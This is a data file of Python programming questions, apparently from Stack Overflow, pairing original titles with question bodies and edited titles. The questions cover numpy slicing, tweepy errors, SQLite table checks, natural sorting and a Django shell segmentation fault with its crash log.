combining two sclicing operations," Is there a smart and easy way to combine two slicing operations into one?Say I have something like Of course in this example this is not a problem, but if the arrays are very large I would very much like to avoid creating the intermediate array (or is there none?). I believe it should be possible to combine the two slices but maybe I'm overseeing something.So the idea would be something like: This of course does not work but is what i would like to do. Is there anything that does combine slicing objects? (despite my efforts I did not find anything). <code>  arange(1000)[::2][10:20]>>> array([20, 22, 24, 26, 28, 30, 32, 34, 36, 38]) arange(1000)[ slice(None,None,2) + slice(10,20,None) ]",combining two slicing operations
Access a function variable outside the function in Python without using `global`," I am trying to access a local function variable outside the function in Python. So, for example, The above works fine as it should. Since I want to find out if I can access bye outside hi() without using global bye, I tried: The above gives AttributeError: 'NoneType' object has no attribute 'bye'.Then, I tried: This time it doesn't give even an error.So, is there a way to access a local function variable (bye) outside its function (hi()) without using globals and without printing out variable sigh as well? (Question was edited to include sigh after @hcwhsa 's comment below. <code>  bye = ''def hi(): global bye something something bye = 5 sigh = 10hi()print bye def hi(): something something bye = 5 sigh = 10 returnhi()x = hi()print x.bye def hi(): something something bye = 5 sigh = 10 return bye hi()x = hi()print x.bye","Access a function variable outside the function without using ""global"""
Access a function variable outside the function without using `global`," I am trying to access a local function variable outside the function in Python. So, for example, The above works fine as it should. Since I want to find out if I can access bye outside hi() without using global bye, I tried: The above gives AttributeError: 'NoneType' object has no attribute 'bye'.Then, I tried: This time it doesn't give even an error.So, is there a way to access a local function variable (bye) outside its function (hi()) without using globals and without printing out variable sigh as well? (Question was edited to include sigh after @hcwhsa 's comment below. <code>  bye = ''def hi(): global bye something something bye = 5 sigh = 10hi()print bye def hi(): something something bye = 5 sigh = 10 returnhi()x = hi()print x.bye def hi(): something something bye = 5 sigh = 10 return bye hi()x = hi()print x.bye","Access a function variable outside the function without using ""global"""
python post tweet tweepy," I'm trying to post a tweet with the tweepy library. I use this code: But when I run the application, I receive this error: How can I fix this? <code>  import tweepyCONSUMER_KEY =""XXXX""CONSUMER_SECRET = ""XXXX"" ACCESS_KEY = ""XXXX"" ACCESS_SECRET = ""XXXX""auth = tweepy.OAuthHandler(CONSUMER_KEY, CONSUMER_SECRET)auth.set_access_token(ACCESS_KEY, ACCESS_SECRET)api = tweepy.API(auth)api.update_status('Updating using OAuth authentication via Tweepy!') raise TweepError(error_msg, resp)TweepError: Read-only application cannot POST.",Post tweet with tweepy
Python: How to find possible English words in long random string," I'm doing an artistic project where I want to see if any information emerges from a long string of characters (~28,000). It's sort of like the problem one faces in solving a Jumble. Here's a snippet: jfifddcceaqaqbrcbdrstcaqaqbrcrisaxohvaefqiygjqotdimwczyiuzajrizbysuyuiathrevwdjxbinwajfgvlxvdpdckszkcyrlliqxsdpunnvmedjjjqrczrrmaaaipuzekpyqflmmymedvovsudctceccgexwndlgwaqregpqqfhgoesrsridfgnlhdwdbbwfmrrsmplmvhtmhdygmhgrjflfcdlolxdjzerqxubwepueywcamgtoifajiimqvychktrtsbabydqnmhcmjhddynrqkoaxeobzbltsuenewvjbstcooziubjpbldrslhmneirqlnpzdsxhyqvfxjcezoumpevmuwxeufdrrwhsmfirkwxfadceflmcmuccqerchkcwvvcbsxyxdownifaqrabyawevahiuxnvfbskivjbtylwjvzrnuxairpunskavvohwfblurcbpbrhapnoahhcqqwtqvmrxaxbpbnxgjmqiprsemraacqhhgjrwnwgcwcrghwvxmqxcqfpcdsrgfmwqvqntizmnvizeklvnngzhcoqgubqtsllvppnedpgtvyqcaicrajbmliasiayqeitcqtexcrtzacpxnbydkbnjpuofyfwuznkfWhat's the most efficient way of searching for all possible English words embedded (both forwards and backwards) in this string? What is a useful dictionary against which to check the substrings? Is there a good library for doing this sort of thing? I have searched around and found some interesting TRIE solutions; but most of them are dealing with the situation where you know the set of words in advance.  <code> ",How to find possible English words in long random string?
DFS (?) algorithm in Python with generators," Background:I was working on a project were I needed to write some rules for text processing. After working on this project for a couple of days and implementing some rules, I realized I needed to determine the order of the rules. No problems, we have topological sorting to help. But then I realized that I can't expect the graph to be always full. So I came up with this idea, that given a single rule with a set of dependencies (or a single dependency) I need to check the dependencies of the dependencies. Sounds familiar? Yes. This subject is very similar to Depth-first-searching of a graph.I am not a mathematician, nor did I study C.S. Hence, Graph Theory is a new field for me. Nevertheless, I implemented something (see below) which works (inefficiently, I suspect).The code:This is my search and yield algorithm. If you run it on the examples below, you will see it visits some nodes more then once. Hence, the speculated inefficiency.A word about the input. The rules I wrote are basically python classes, which have a class property depends. I was criticized for not using inspect.getmro- But this would complicate thing terribly because the class would need to inherit from each other (See example here) OK, now that you stared in the code, here is some input you can test: The questions:I tried classifying my work, and I think what I did is similar to DFS. Can you really classify it like this?How can I improve this function to skip visited nodes, and still use generators ?update:Just to save you the trouble running the code, the output of the above function is: In the mean while I came up with a better solution, the question above still remain. So feel free to criticize my solution: The output of the above is: So as you can see now the node E is visited only once. <code>  def _yield_name_dep(rules_deps): global recursion_counter recursion_counter = recursion_counter +1 # yield all rules by their named and dependencies for rule, dep in rules_deps.items(): if not dep: yield rule, dep continue else: yield rule, dep for ii in dep: i = getattr(rules, ii) instance = i() if instance.depends: new_dep={str(instance): instance.depends} for dep in _yield_name_dep(new_dep): yield dep else: yield str(instance), instance.depends demo_class_content =""""""class A(object): depends = ('B') def __str__(self): return self.__class__.__name__class B(object): depends = ('C','F') def __str__(self): return self.__class__.__name__class C(object): depends = ('D', 'E') def __str__(self): return self.__class__.__name__class D(object): depends = None def __str__(self): return self.__class__.__name__ class F(object): depends = ('E') def __str__(self): return self.__class__.__name__class E(object): depends = None def __str__(self): return self.__class__.__name__"""""" with open('demo_classes.py', 'w') as clsdemo: clsdemo.write(demo_class_content)import demo_classes as rulesrule_start={'A': ('B')}def _yield_name_dep(rules_deps): # yield all rules by their named and dependencies for rule, dep in rules_deps.items(): if not dep: yield rule, dep continue else: yield rule, dep for ii in dep: i = getattr(rules, ii) instance = i() if instance.depends: new_dep={str(instance): instance.depends} for dep in _yield_name_dep(new_dep): yield dep else: yield str(instance), instance.dependsif __name__ == '__main__': # this is yielding nodes visited multiple times, # list(_yield_name_dep(rule_start)) # hence, my work around was to use set() ... rule_dependencies = list(set(_yield_name_dep(rule_start))) print rule_dependencies >>> print list(_yield_name_dep(rule_wd))[('A', 'B'), ('B', ('C', 'F')), ('C', ('D', 'E')), ('D', None), ('E', None), ('F', 'E'), ('E', None)]>>> print list(set(_yield_name_dep(rule_wd)))[('B', ('C', 'F')), ('E', None), ('D', None), ('F', 'E'), ('C', ('D', 'E')), ('A', 'B')] visited = []def _yield_name_dep_wvisited(rules_deps, visited): # yield all rules by their name and dependencies for rule, dep in rules_deps.items(): if not dep and rule not in visited: yield rule, dep visited.append(rule) continue elif rule not in visited: yield rule, dep visited.append(rule) for ii in dep: i = getattr(grules, ii) instance = i() if instance.depends: new_dep={str(instance): instance.depends} for dep in _yield_name_dep_wvisited(new_dep, visited): if dep not in visited: yield dep elif str(instance) not in visited: visited.append(str(instance)) yield str(instance), instance.depends >>>list(_yield_name_dep_wvisited(rule_wd, visited))[('A', 'B'), ('B', ('C', 'F')), ('C', ('D', 'E')), ('D', None), ('E', None), ('F', 'E')]",DFS algorithm in Python with generators
Pip list crashes with an AsertionError," What might be the problem below? It looks like there is a bug in pip. I installed pip yesterday using brew. Prior to that, I had installed most python packages with $ python setup.py install <code>  steves-MacBook-Pro:server steve$ pip -Vpip 1.4.1 from /Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg (python 2.7)steves-MacBook-Pro:server steve$ pip listaltgraph (0.9)bdist-mpkg (0.4.4)... ...(a bunch of python packages omitted here for brevity)......requests (2.0.0)Exception:Traceback (most recent call last): File ""/Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg/pip/basecommand.py"", line 134, in main status = self.run(options, args) File ""/Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg/pip/commands/list.py"", line 80, in run self.run_listing(options) File ""/Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg/pip/commands/list.py"", line 127, in run_listing self.output_package_listing(installed_packages) File ""/Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg/pip/commands/list.py"", line 136, in output_package_listing if dist_is_editable(dist): File ""/Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg/pip/util.py"", line 347, in dist_is_editable req = FrozenRequirement.from_dist(dist, []) File ""/Library/Python/2.7/site-packages/pip-1.4.1-py2.7.egg/pip/__init__.py"", line 194, in from_dist assert len(specs) == 1 and specs[0][0] == '=='AssertionError",Pip list crashes with an AssertionError
find where a numpy array is equal to any value of a list of values," I have an array of integers and want to find where that array is equal to any value in a list of multiple values.This can easily be done by treating each value individually, or by using multiple ""or"" statements in a loop, but I feel like there must be a better/faster way to do it. I'm actually dealing with arrays of size 4000 x 2000, but here is a simplified edition of the problem: What I would like is a way to get want from a single command involving fake and the list of values [0, 2, 6, 8].I'm assuming there is a package that has this included already that would be significantly faster than if I just wrote a function with a loop in Python. <code>  fake = arange(9).reshape((3,3))array([[0, 1, 2], [3, 4, 5], [6, 7, 8]])want = (fake==0) + (fake==2) + (fake==6) + (fake==8)print want array([[ True, False, True], [False, False, False], [ True, False, True]], dtype=bool)",Find where a NumPy array is equal to any value in a list of values
statically typed C# and dynamically typed Python," While studying C# I found it really strange, that dynamically typed Python will rise an error in the following code: whereas statically typed C# will normally proceed the similar code: I would expect other way around (in python I would be able to do this without any casting, but C# would require me to cast int to string or string to int).Just to highlight, I am not asking what language is better, I am curious what was the reason behind implementing the language this way. <code>  i = 5print i + "" "" int i = 5;Console.Write(i + "" "");","Why is ""int + string"" possible in statically-typed C# but not in dynamically-typed Python?"
"Need a good tutorial on parsing json fields in python 2.7. New to python, don't understand the python documentation on json parsing"," Is there a good tutorial on parsing json attributes in python? I would like to be able to parse the true value for ""ok"" field. As well as the index named ""client_ind_1"". I don't understand the python document coverage on this topic. If someone could explain or point me to a better resource, it would be awesome.My json string looks like the below: Thank you in advance. <code>  { ""ok"": true, ""_shards"": { ""total"": 2, ""successful"": 1, ""failed"": 0 }, ""indices"": { ""client_ind_2"": { ""index"": { ""primary_size"": ""2.5mb"", ""primary_size_in_bytes"": 2710326, ""size"": ""2.5mb"", ""size_in_bytes"": 2710326 } } }}",parsing json fields in python
python: strip everything but numbers," I have to extract a number (a measured time value) from each of several strings. How could I do this elegantly? All numbers are positive and have a maximum of two decimal places. (E.g.: 2.3/ 40.09/ 101.4 - no numbers in E notation). The code I am looking for should do something like the following pseudocode:  <code>  >>> ""It took 2.3 seconds"".strip(everything but "".1234567890"")2.3",Python: Strip Everything but Numbers
How to test if table already exist - Python," I'm working on a scrabblecheat programFollowing some examples I have the following code below which uses SQLite for a simple database to store my words.However it tells me I can't recreate the database table.How do I write in a check for if there is already a table named spwords, then skip trying to create it?The error: The Code: <code>  (<class 'sqlite3.OperationalError'>, OperationalError('table spwords already exists',), None) def load_db(data_list):# create database/connection string/tableconn = sqlite.connect(""sowpods.db"")#cursor = conn.cursor()# create a tabletb_create = """"""CREATE TABLE spwords (sp_word text, word_len int, word_alpha text, word_score int) """"""conn.execute(tb_create) # <- error happens hereconn.commit()# Fill the tableconn.executemany(""insert into spwords(sp_word, word_len, word_alpha, word_score) values (?,?,?,?)"", data_list)conn.commit()# Print the table contentsfor row in conn.execute(""select sp_word, word_len, word_alpha, word_score from spwords""): print (row)if conn: conn.close()",How to test if a table already exists?
How to test if table already exist," I'm working on a scrabblecheat programFollowing some examples I have the following code below which uses SQLite for a simple database to store my words.However it tells me I can't recreate the database table.How do I write in a check for if there is already a table named spwords, then skip trying to create it?The error: The Code: <code>  (<class 'sqlite3.OperationalError'>, OperationalError('table spwords already exists',), None) def load_db(data_list):# create database/connection string/tableconn = sqlite.connect(""sowpods.db"")#cursor = conn.cursor()# create a tabletb_create = """"""CREATE TABLE spwords (sp_word text, word_len int, word_alpha text, word_score int) """"""conn.execute(tb_create) # <- error happens hereconn.commit()# Fill the tableconn.executemany(""insert into spwords(sp_word, word_len, word_alpha, word_score) values (?,?,?,?)"", data_list)conn.commit()# Print the table contentsfor row in conn.execute(""select sp_word, word_len, word_alpha, word_score from spwords""): print (row)if conn: conn.close()",How to test if a table already exists?
sort results non lexicographically?," I'm trying to display some results in a human-readable way. For the purposes of this question, some of them are numbers, some are letters, some are a combination of the two.I'm trying to figure out how I could get them to sort like this: Desired Results: Actual results: I'm having trouble coming up with how to do this. <code>  input = ['1', '10', '2', '0', '3', 'Hello', '100', 'Allowance']sorted_input = sorted(input)print(sorted_input) ['0', '1', '2', '3', '10', '100', 'Allowance', 'Hello'] ['0', '1', '10', '100', '2', '3', 'Allowance', 'Hello']",Sort results non-lexicographically?
is that possible to caculate the number of count inversions using quicksort?," I have already solved the problem using mergesort, now I am thinking is that possible to calculate the number using quicksort? I also coded the quicksort, but I don't know how to calculate. Here is my code <code>  def Merge_and_Count(AL, AR): count=0 i = 0 j = 0 A = [] for index in range(0, len(AL) + len(AR)): if i<len(AL) and j<len(AR): if AL[i] > AR[j]: A.append(AR[j]) j = j + 1 count = count+len(AL) - i else: A.append(AL[i]) i = i + 1 elif i<len(AL): A.append(AL[i]) i=i+1 elif j<len(AR): A.append(AR[j]) j=j+1 return(count,A)def Sort_and_Count(Arrays): if len(Arrays)==1: return (0,Arrays) list1=Arrays[:len(Arrays) // 2] list2=Arrays[len(Arrays) // 2:] (LN,list1) = Sort_and_Count(list1) (RN,list2) = Sort_and_Count(list2) (M,Arrays)= Merge_and_Count(list1,list2) return (LN + RN + M,Arrays)",Is it possible to calculate the number of count inversions using quicksort?
Besst way to check function arguments in Python," I'm looking for an efficient way to check variables of a Python function. For example, I'd like to check arguments type and value. Is there a module for this? Or should I use something like decorators, or any specific idiom? <code>  def my_function(a, b, c): """"""An example function I'd like to check the arguments of."""""" # check that a is an int # check that 0 < b < 10 # check that c is not an empty string",Best way to check function arguments?
Best way to check function arguments in Python," I'm looking for an efficient way to check variables of a Python function. For example, I'd like to check arguments type and value. Is there a module for this? Or should I use something like decorators, or any specific idiom? <code>  def my_function(a, b, c): """"""An example function I'd like to check the arguments of."""""" # check that a is an int # check that 0 < b < 10 # check that c is not an empty string",Best way to check function arguments?
Does Python have a cleaner way to express if x contains a|b|c|d...?," The Pythonic way to check if a string x is a substring of y is: Finding if x is equivalent to a, b, c, d, e, f or g is also Pythonic: But checking if some string x contains either a, b, c, d, e, f or g seems clunky: Is there a more Pythonic method of checking if a string x contains an element of a list?I know it is trivial to write this myself using a loop or using a regex: but I was wondering if there was a cleaner way that does not involve regex. <code>  if x in y: if x in [a,b,c,d,e,f,g]: if a in x or b in x or c in x or d in x or e in x or f in x or g in x re.search('(dog|cat|bird|mouse|elephant|pig|cow)', x)","Does Python have a cleaner way to express ""if x contains a|b|c|d...""?"
what is homogenous in python list documentation?," In python documentation list is defined as: mutable sequences, typically used to store collections of homogeneous items (where the precise degree of similarity will vary by application).Why it's used to store collections of homogeneous items?Are a string and an int item also homogeneous then? <code>  a = [12,""hello""]","What is ""homogenous"" in Python list documentation?"
Python segmentation error working in shell," I'm working on a small-ish Django system, it uses about 14,000 records. I hadn't used aggregate features before, so wanted to play about with them in shell. When I do from core.models import Match followed by from django.db.models import Avg I get a segmentation error. Background reading suggests this is a memory problem; I've tried closing everything possible and cleaning unused memory, so I'm running with about 4Gb free.I can import either command, in either order (so Match, the dataset can be imported first or second, doesn't matter) on its own - it's only when I try and import another module, or manipulate it that I get the error. Example: or similarly, running in dif order works until the second command: If relevant, I'm just running the Django devserver on SQLite3 on localhost. I understand from background reading that this could be a result of some unexpected loading into memory, but have no idea where to start trying to troubleshoot - I'm not running any code here, just using the Django ORM in shell. EDIT: I've since tested this further; I'm getting it a lot on a number of different imports. The console log crash report looks like this: Further edit: There appears to be a known bug on this. I installed Mavericks about 4 days ago, and this has appeared since then; I suspect I can suppress the problem using that Q's solution if no-one's going to tell me otherwise.  <code>  >>> from core.models import Match>>> t = match.objects.filter(team_name=""Coventry"")Segmentation fault: 11 >>> from django.db.models import Avg>>> from core.models import MatchSegmentation fault: 11 >>> from core.models import Match>>> from django.db.models import AvgSegmentation fault: 11 >>> from bisect import *>>> from datetime import date Process: Python [28541]Path: /Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/PythonIdentifier: PythonVersion: 2.7.5 (2.7.5)Code Type: X86-64 (Native)Parent Process: bash [28528]Responsible: Terminal [2961]User ID: 501Date/Time: 2013-11-02 16:24:56.399 +0000OS Version: Mac OS X 10.9 (13A603)Report Version: 11Anonymous UUID: DACFC213-DBA4-860A-C887-96B155D16223Sleep/Wake UUID: 0FCC648C-E20C-41CF-AB70-019F755C62CACrashed Thread: 0 Dispatch queue: com.apple.main-threadException Type: EXC_BAD_ACCESS (SIGSEGV)Exception Codes: KERN_INVALID_ADDRESS at 0x0000000000000000VM Regions Near 0:--> __TEXT 0000000100000000-0000000100001000 [ 4K] r-x/rwx SM=COW /Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/PythonThread 0 Crashed:: Dispatch queue: com.apple.main-thread0 readline.so 0x00000001025ebf97 call_readline + 6471 org.python.python 0x0000000100008e22 PyOS_Readline + 2742 org.python.python 0x00000001000b8315 builtin_raw_input + 5973 org.python.python 0x00000001000c35fd PyEval_EvalFrameEx + 252134 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 21375 org.python.python 0x00000001000c31bd PyEval_EvalFrameEx + 241256 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 21377 org.python.python 0x00000001000c31bd PyEval_EvalFrameEx + 241258 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 21379 org.python.python 0x00000001000c31bd PyEval_EvalFrameEx + 2412510 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 213711 org.python.python 0x000000010003e510 function_call + 17612 org.python.python 0x000000010000c932 PyObject_Call + 9813 org.python.python 0x00000001000be63d PyEval_EvalFrameEx + 479714 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 213715 org.python.python 0x000000010003e510 function_call + 17616 org.python.python 0x000000010000c932 PyObject_Call + 9817 org.python.python 0x00000001000be63d PyEval_EvalFrameEx + 479718 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 213719 org.python.python 0x000000010003e510 function_call + 17620 org.python.python 0x000000010000c932 PyObject_Call + 9821 org.python.python 0x00000001000be63d PyEval_EvalFrameEx + 479722 org.python.python 0x00000001000c3fed PyEval_EvalFrameEx + 2775723 org.python.python 0x00000001000c3fed PyEval_EvalFrameEx + 2775724 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 213725 org.python.python 0x00000001000c31bd PyEval_EvalFrameEx + 2412526 org.python.python 0x00000001000c58c9 PyEval_EvalCodeEx + 213727 org.python.python 0x00000001000c59e6 PyEval_EvalCode + 5428 org.python.python 0x00000001000ea28e PyRun_FileExFlags + 17429 org.python.python 0x00000001000ea52a PyRun_SimpleFileExFlags + 45830 org.python.python 0x00000001001014ed Py_Main + 310131 org.python.python 0x0000000100000f14 0x100000000 + 3860Thread 0 crashed with X86 Thread State (64-bit): rax: 0x0000000000000000 rbx: 0x000000010074ca40 rcx: 0x0000000100700000 rdx: 0x0000000000001e00 rdi: 0x0000000000000000 rsi: 0x00000001025ec254 rbp: 0x00007fff5fbfd720 rsp: 0x00007fff5fbfd650 r8: 0x0000000100700000 r9: 0x000000000000058a r10: 0x0001000040080003 r11: 0x0000000000000001 r12: 0x0000000000000001 r13: 0x000000000000001c r14: 0x00007fff5fbfd6e0 r15: 0x00007fff5fbfd660 rip: 0x00000001025ebf97 rfl: 0x0000000000010206 cr2: 0x0000000000000000Logical CPU: 3Error Code: 0x00000004Trap Number: 14Binary Images: 0x100000000 - 0x100000fff +org.python.python (2.7.5 - 2.7.5) <29DAB82B-5BC9-56CE-C09D-AE442FB37EF0> /Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python 0x100003000 - 0x10016ffff +org.python.python (2.7.5, [c] 2004-2013 Python Software Foundation. - 2.7.5) <CDFB33CA-71DD-B1C2-5262-545F3FA06153> /Library/Frameworks/Python.framework/Versions/2.7/Python 0x1002f1000 - 0x1002f5fff +_collections.so (???) <C3759257-D3E2-1A2D-5B6D-F5CE2BAD59F1> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_collections.so 0x1002fb000 - 0x1002fcff7 +_heapq.so (???) <E4381E05-EEF3-6948-2616-3133F9266C5B> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_heapq.so 0x1005f0000 - 0x1005f4ff7 +operator.so (???) <8203644B-B77C-2E1C-A0AF-614C0E9FA0CC> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/operator.so 0x1005fb000 - 0x100602ff7 +itertools.so (???) <8B7B7425-93EC-2588-DEA6-9CBE9FB670E8> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/itertools.so 0x10060d000 - 0x100610ff7 +strop.so (???) <EF084977-083D-4241-3E1C-F784D1EC6BC2> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/strop.so 0x100655000 - 0x100656ff7 +_functools.so (???) <B0EB3CA3-1D94-8F0F-C2CE-4FB7651C9EB4> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_functools.so 0x100659000 - 0x10065bfff +_locale.so (???) <C498D276-0D22-5EB7-0332-8FD47164BCC5> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_locale.so 0x10065f000 - 0x100663fff +_struct.so (???) <C5DCD024-216C-FA09-AE53-F5C308DC7EE0> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_struct.so 0x1006aa000 - 0x1006b8ff7 +datetime.so (???) <6F932ED3-23A3-53F7-CAAB-6E532A327C13> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/datetime.so 0x1006f1000 - 0x1006f6fff +math.so (???) <DBF975FC-2716-ADD3-6911-5D951CB0DB61> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/math.so 0x102100000 - 0x102102ff7 +time.so (???) <71BBC363-EB64-7E83-016A-85019ABE11A9> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/time.so 0x102147000 - 0x102150ff7 +_socket.so (???) <695EB730-7782-CEC0-96D7-C82415A58249> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_socket.so 0x10215c000 - 0x102160ff7 +_ssl.so (???) <F11C5431-BBBC-472E-1D78-F3FEAA774381> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_ssl.so 0x102166000 - 0x102167fff +cStringIO.so (???) <84827C5D-2394-D102-142B-87FBAD4A785A> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/cStringIO.so 0x10216c000 - 0x10216ffef +binascii.so (???) <B1341D2E-EC17-A209-F850-C3CFDDDFCFD6> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/binascii.so 0x1021b3000 - 0x1021b3fff +_scproxy.so (???) <2635F535-7B37-6190-16D7-FAC536366A2D> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_scproxy.so 0x1021b6000 - 0x1021b9fff +select.so (???) <81AE4135-7CD3-5C92-D8BA-8B6ADF4F866A> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/select.so 0x1021bf000 - 0x1021c0ff7 +fcntl.so (???) <65448CBF-233E-1A16-976B-7C02357CFAAE> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/fcntl.so 0x102203000 - 0x102204fff +_hashlib.so (???) <F3E00F49-7684-BCA0-3053-6E36EEED082A> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_hashlib.so 0x102208000 - 0x102209fff +_random.so (???) <479693CA-BFEF-F888-1CE7-9BD4FD43BBAA> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_random.so 0x10228c000 - 0x10229bfff +cPickle.so (???) <72BD5DBF-624F-B0F4-0783-F75BB293F602> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/cPickle.so 0x1022a3000 - 0x1022b8ff7 +_io.so (???) <AC3AF946-5DCF-662C-0DC7-5F57FDD3CD4B> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_io.so 0x1022d0000 - 0x1022d5fff +_json.so (???) <E4EE27AB-C49E-6A19-B603-1DA85AD3AF1E> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_json.so 0x1022da000 - 0x1022ddff7 +zlib.so (???) <7627B90E-3DA2-DE67-F574-CBE4F8816949> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/zlib.so 0x1022e2000 - 0x1022e7fff +array.so (???) <142AB497-D764-55A8-7FDB-D2A154D3054E> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/array.so 0x1022ef000 - 0x1022effff +_bisect.so (???) <6FA6B60B-13DC-2E86-D409-628062C08CAC> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_bisect.so 0x1022f2000 - 0x1022f2fff +grp.so (???) <0F086696-FDA8-FABD-5051-D2B342BB56A6> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/grp.so 0x1022f5000 - 0x1022f8fff +_zope_interface_coptimizations.so (???) <897FE7EC-5D39-3C36-9EE1-0D04B10C5D8C> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/zope/interface/_zope_interface_coptimizations.so 0x102480000 - 0x102514fef +unicodedata.so (???) <6C701F70-D60D-E225-74D2-C8A0A7651DA5> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/unicodedata.so 0x1025ea000 - 0x1025ecff7 +readline.so (???) <6EA1FE1F-B78C-23EF-A4C2-9B7E9FB8B643> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/readline.so 0x1029c0000 - 0x102a62ff7 +_sqlite3.so (???) <E90E5264-66AD-9194-19E2-74231C7F9B84> /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload/_sqlite3.so 0x103880000 - 0x10389effb libedit.2.dylib (39) <1B0596DB-F336-32E7-BB9F-51BF70DB5305> /usr/lib/libedit.2.dylib 0x103a00000 - 0x103a54fe7 +libncursesw.5.dylib (5) <3F0079C0-01C1-3CB8-19CA-F9B49AA4F4A4> /Library/Frameworks/Python.framework/Versions/2.7/lib/libncursesw.5.dylib 0x7fff67fb7000 - 0x7fff67fea817 dyld (239.3) <D1DFCF3F-0B0C-332A-BCC0-87A851B570FF> /usr/lib/dyld 0x7fff87157000 - 0x7fff8715eff3 libcopyfile.dylib (103) <5A881779-D0D6-3029-B371-E3021C2DDA5E> /usr/lib/system/libcopyfile.dylib 0x7fff884c2000 - 0x7fff884ccfff libcommonCrypto.dylib (60049) <8C4F0CA0-389C-3EDC-B155-E62DD2187E1D> /usr/lib/system/libcommonCrypto.dylib 0x7fff8863c000 - 0x7fff88642ff7 libsystem_platform.dylib (24.1.4) <331BA4A5-55CE-3B95-99EB-44E0C89D7FB8> /usr/lib/system/libsystem_platform.dylib 0x7fff88873000 - 0x7fff88876ff7 libdyld.dylib (239.3) <62F4D752-4089-31A8-8B73-B95A68893B3C> /usr/lib/system/libdyld.dylib 0x7fff88feb000 - 0x7fff88fecff7 libDiagnosticMessagesClient.dylib (100) <4CDB0F7B-C0AF-3424-BC39-495696F0DB1E> /usr/lib/libDiagnosticMessagesClient.dylib 0x7fff892ac000 - 0x7fff892b4fff libsystem_dnssd.dylib (522.1.11) <270DCF6C-502D-389A-AA9F-DE4624A36FF7> /usr/lib/system/libsystem_dnssd.dylib 0x7fff8937d000 - 0x7fff89382ff7 libunwind.dylib (35.3) <78DCC358-2FC1-302E-B395-0155B47CB547> /usr/lib/system/libunwind.dylib 0x7fff89909000 - 0x7fff8995bfff libc++.1.dylib (120) <4F68DFC5-2077-39A8-A449-CAC5FDEE7BDE> /usr/lib/libc++.1.dylib 0x7fff89aaa000 - 0x7fff89aecff7 libauto.dylib (185.5) <F45C36E8-B606-3886-B5B1-B6745E757CA8> /usr/lib/libauto.dylib 0x7fff8b5a7000 - 0x7fff8b5aeff7 liblaunch.dylib (842.1.4) <FCBF0A02-0B06-3F97-9248-5062A9DEB32C> /usr/lib/system/liblaunch.dylib 0x7fff8bad9000 - 0x7fff8baeaff7 libz.1.dylib (53) <42E0C8C6-CA38-3CA4-8619-D24ED5DD492E> /usr/lib/libz.1.dylib 0x7fff8bbbc000 - 0x7fff8bbbcff7 libkeymgr.dylib (28) <3AA8D85D-CF00-3BD3-A5A0-E28E1A32A6D8> /usr/lib/system/libkeymgr.dylib 0x7fff8bbd0000 - 0x7fff8bbd1ff7 libsystem_blocks.dylib (63) <FB856CD1-2AEA-3907-8E9B-1E54B6827F82> /usr/lib/system/libsystem_blocks.dylib 0x7fff8be5e000 - 0x7fff8be62fff libsystem_stats.dylib (93.1.26) <B9E26A9E-FBBC-3938-B8B7-6CF7CA8C99AD> /usr/lib/system/libsystem_stats.dylib 0x7fff8be80000 - 0x7fff8be81fff com.apple.TrustEvaluationAgent (2.0 - 25) <334A82F4-4AE4-3719-A511-86D0B0723E2B> /System/Library/PrivateFrameworks/TrustEvaluationAgent.framework/Versions/A/TrustEvaluationAgent 0x7fff8c51f000 - 0x7fff8c521ff7 libquarantine.dylib (71) <7A1A2BCB-C03D-3A25-BFA4-3E569B2D2C38> /usr/lib/system/libquarantine.dylib 